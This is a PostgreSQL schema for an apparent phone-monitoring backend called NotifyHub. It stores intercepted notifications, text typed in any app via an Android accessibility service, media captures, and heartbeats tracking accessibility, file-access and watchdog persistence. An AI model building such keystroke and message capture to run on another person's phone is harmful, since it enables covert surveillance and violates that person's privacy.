-- Run once to initialize the NotifyHub database
-- psql "$DATABASE_URL" -f server/src/db/schema.sql
-- Or paste into the Neon SQL console at console.neon.tech

CREATE TABLE IF NOT EXISTS notifications (
    id           BIGSERIAL    PRIMARY KEY,
    device_id    VARCHAR(64)  NOT NULL,
    package_name VARCHAR(255) NOT NULL,
    app_label    VARCHAR(255) NOT NULL DEFAULT '',
    title        TEXT,
    text_body    TEXT,
    big_text     TEXT,
    sub_text     TEXT,
    sender_name  TEXT         NOT NULL DEFAULT '',
    chat_body    TEXT,
    posted_at    TIMESTAMPTZ  NOT NULL,
    received_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    dedup_hash   VARCHAR(64)  NOT NULL,
    image_url    TEXT,
    image_source TEXT,
    photo_intent BOOLEAN      NOT NULL DEFAULT FALSE,
    related_notification_hash TEXT,
    notification_key TEXT,
    channel_id   TEXT,
    category     TEXT,
    group_key    TEXT,
    sort_key     TEXT,
    conversation_title TEXT,
    flags        INTEGER      NOT NULL DEFAULT 0,
    extras_json  TEXT,
    is_read      BOOLEAN      NOT NULL DEFAULT FALSE,
    is_archived  BOOLEAN      NOT NULL DEFAULT FALSE,
    -- Server-side deduplication: same device cannot post the same hash twice
    CONSTRAINT uq_device_dedup UNIQUE (device_id, dedup_hash)
);

CREATE INDEX IF NOT EXISTS idx_notif_received ON notifications (received_at DESC);
CREATE INDEX IF NOT EXISTS idx_notif_device   ON notifications (device_id);
CREATE INDEX IF NOT EXISTS idx_notif_package  ON notifications (package_name);
CREATE INDEX IF NOT EXISTS idx_notif_unread   ON notifications (is_read) WHERE is_read = FALSE;
CREATE INDEX IF NOT EXISTS idx_notif_throttle ON notifications (device_id, package_name, received_at DESC);
CREATE INDEX IF NOT EXISTS idx_notif_posted ON notifications (device_id, posted_at DESC);

-- Text typed into editable fields, captured by the Android accessibility service.
-- Password fields are never sent by the client.
CREATE TABLE IF NOT EXISTS typed_text (
    id           BIGSERIAL    PRIMARY KEY,
    device_id    VARCHAR(64)  NOT NULL,
    package_name VARCHAR(255) NOT NULL,
    app_label    VARCHAR(255) NOT NULL DEFAULT '',
    target_name  TEXT         NOT NULL DEFAULT '',
    raw_package  TEXT         NOT NULL DEFAULT '',
    raw_app_label TEXT        NOT NULL DEFAULT '',
    resolved_package TEXT,
    resolved_app_label TEXT,
    attribution_source TEXT,
    attribution_confidence REAL NOT NULL DEFAULT 0,
    target_source TEXT,
    class_name   TEXT,
    view_id      TEXT,
    hint_text    TEXT,
    content_description TEXT,
    input_type   INTEGER,
    event_type   INTEGER,
    text         TEXT         NOT NULL,
    captured_at  TIMESTAMPTZ  NOT NULL,
    received_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW()
);

ALTER TABLE typed_text ADD COLUMN IF NOT EXISTS target_name TEXT NOT NULL DEFAULT '';

CREATE TABLE IF NOT EXISTS favorites (
    id          BIGSERIAL    PRIMARY KEY,
    device_id   VARCHAR(64)  NOT NULL,
    item_key    VARCHAR(8)   NOT NULL,
    item_id     BIGINT       NOT NULL,
    created_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    CONSTRAINT uq_favorite_item UNIQUE (device_id, item_key, item_id)
);

CREATE INDEX IF NOT EXISTS idx_typed_received ON typed_text (received_at DESC);
CREATE INDEX IF NOT EXISTS idx_typed_timeline ON typed_text (device_id, package_name, captured_at DESC);
CREATE INDEX IF NOT EXISTS idx_typed_device   ON typed_text (device_id);
CREATE INDEX IF NOT EXISTS idx_typed_package  ON typed_text (package_name);

-- Photos, video thumbnails, downloads, and media explicitly shared to the app.
CREATE TABLE IF NOT EXISTS media_captures (
    id                 BIGSERIAL    PRIMARY KEY,
    device_id          VARCHAR(64)  NOT NULL,
    source             VARCHAR(32)  NOT NULL,
    package_name       VARCHAR(255) NOT NULL DEFAULT '',
    app_label          VARCHAR(255) NOT NULL DEFAULT '',
    media_type         VARCHAR(32)  NOT NULL,
    display_name       TEXT,
    mime_type          VARCHAR(128),
    original_mime_type VARCHAR(128),
    size_bytes         BIGINT       NOT NULL DEFAULT 0,
    width              INTEGER,
    height             INTEGER,
    duration_ms        BIGINT,
    captured_at        TIMESTAMPTZ  NOT NULL,
    received_at        TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    dedup_hash         VARCHAR(64)  NOT NULL,
    media_url          TEXT,
    thumbnail_urls     TEXT NOT NULL DEFAULT '[]',
    related_notification_hash TEXT,
    action             TEXT,
    CONSTRAINT uq_media_device_dedup UNIQUE (device_id, dedup_hash)
);

ALTER TABLE media_captures ADD COLUMN IF NOT EXISTS thumbnail_urls TEXT NOT NULL DEFAULT '[]';

CREATE INDEX IF NOT EXISTS idx_media_received ON media_captures (received_at DESC);
CREATE INDEX IF NOT EXISTS idx_media_timeline ON media_captures (device_id, captured_at DESC);
CREATE INDEX IF NOT EXISTS idx_media_device   ON media_captures (device_id);
CREATE INDEX IF NOT EXISTS idx_media_package  ON media_captures (package_name);
CREATE INDEX IF NOT EXISTS idx_media_source   ON media_captures (source);
CREATE INDEX IF NOT EXISTS idx_media_related_notification ON media_captures (related_notification_hash);

CREATE INDEX IF NOT EXISTS idx_favorites_device ON favorites (device_id, created_at DESC);

-- Heartbeats from each companion app. The dashboard uses these to show which
-- app is active on each phone, and the API uses them to arbitrate forwarding.
CREATE TABLE IF NOT EXISTS app_status (
    device_id             VARCHAR(64)  NOT NULL,
    app_role              VARCHAR(32)  NOT NULL,
    package_name          VARCHAR(255) NOT NULL,
    app_label             VARCHAR(255) NOT NULL DEFAULT '',
    version_name          VARCHAR(64)  NOT NULL DEFAULT '',
    listener_enabled      BOOLEAN      NOT NULL DEFAULT FALSE,
    accessibility_enabled BOOLEAN      NOT NULL DEFAULT FALSE,
    battery_exempt        BOOLEAN      NOT NULL DEFAULT FALSE,
    media_enabled         BOOLEAN      NOT NULL DEFAULT FALSE,
    all_files_access      BOOLEAN      NOT NULL DEFAULT FALSE,
    listener_connected    BOOLEAN      NOT NULL DEFAULT FALSE,
    foreground_service_running BOOLEAN NOT NULL DEFAULT FALSE,
    watchdog_enabled      BOOLEAN      NOT NULL DEFAULT FALSE,
    boot_time             TIMESTAMPTZ,
    install_time          TIMESTAMPTZ,
    update_time           TIMESTAMPTZ,
    last_listener_event_at TIMESTAMPTZ,
    typed_text_alive_at   TIMESTAMPTZ,
    typed_text_last_event_at TIMESTAMPTZ,
    typed_text_connected  BOOLEAN,
    typed_service_bind_total BIGINT    NOT NULL DEFAULT 0,
    typed_events_total    BIGINT       NOT NULL DEFAULT 0,
    typed_text_sent_total BIGINT       NOT NULL DEFAULT 0,
    typed_placeholder_rejected_total BIGINT NOT NULL DEFAULT 0,
    typed_service_reconnect_total BIGINT NOT NULL DEFAULT 0,
    watchdog_last_fired_at TIMESTAMPTZ,
    notification_rebind_total BIGINT  NOT NULL DEFAULT 0,
    listener_last_connected_at TIMESTAMPTZ,
    listener_last_disconnected_at TIMESTAMPTZ,
    notification_images_total BIGINT  NOT NULL DEFAULT 0,
    notification_images_failed_total BIGINT NOT NULL DEFAULT 0,
    last_seen             TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    PRIMARY KEY (device_id, app_role)
);

CREATE INDEX IF NOT EXISTS idx_app_status_device ON app_status (device_id);
CREATE INDEX IF NOT EXISTS idx_app_status_seen   ON app_status (last_seen DESC);
